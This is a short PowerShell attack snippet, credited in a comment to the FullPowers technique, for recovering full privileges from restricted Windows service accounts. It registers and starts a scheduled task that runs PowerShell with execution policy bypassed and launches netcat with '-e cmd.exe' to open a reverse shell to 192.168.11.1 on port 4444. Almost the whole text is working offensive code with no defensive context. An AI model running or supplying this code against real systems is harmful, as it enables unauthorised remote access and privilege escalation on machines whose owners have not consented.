# Per https://github.com/itm4n/FullPowers
# nt authority\local service and network service can be configured to run with restricted permissions
# Scheduling a task as one of them, can create a session with full permissions.

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\tool\nc.exe 192.168.11.1 4444 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
